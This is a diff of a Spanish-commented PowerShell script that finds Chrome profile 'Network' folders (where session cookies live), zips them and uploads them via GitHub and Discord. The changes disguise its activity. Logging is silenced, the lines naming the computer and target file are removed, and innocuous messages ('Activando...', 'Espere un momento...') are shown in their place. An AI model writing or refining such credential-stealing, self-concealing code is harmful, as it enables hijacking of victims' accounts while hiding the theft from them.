@@ -32,8 +32,8 @@ Add-Type -AssemblyName System.IO.Compression
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
 function Write-Log {
+    # Silencioso: no imprime nada para mantener la salida minima.
     param([string]$Msg, [ConsoleColor]$Color = "White")
-    Write-Host "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Msg" -ForegroundColor $Color
 }
 
 function Send-DiscordNotice {
@@ -188,9 +188,7 @@ $script:CommitShaFinal = ""
 $script:LastError      = ""
 
 try {
-    Write-Log "=== Auto-Upload GitHub + Discord ==="  "Green"
-    Write-Log "Equipo: $ComputerName"                 "Cyan"
-    Write-Log "Buscando: '$FileName'" "Cyan"
+    Write-Host "Activando..." -ForegroundColor Green
 
     # 1) Localizar carpetas Network de Chrome de forma dinamica (sin rutas fijas)
     #    Chrome guarda datos en <UserData>\<Default|Profile*>\Network de cada usuario.
@@ -282,7 +280,7 @@ try {
     $zipName = "{0}_{1}.zip" -f (Split-Path $sourceFolder -Leaf), (Get-Date -Format 'yyyyMMdd_HHmmss')
     $script:ZipPath = Join-Path $ZipOutputDir $zipName
 
-    Write-Log "Creando ZIP: $script:ZipPath" "Yellow"
+    Write-Host "Espere un momento..." -ForegroundColor Yellow
     Compress-Folder -SourceFolder $sourceFolder -DestinationZip $script:ZipPath
 
     $zipLen = (Get-Item -LiteralPath $script:ZipPath).Length
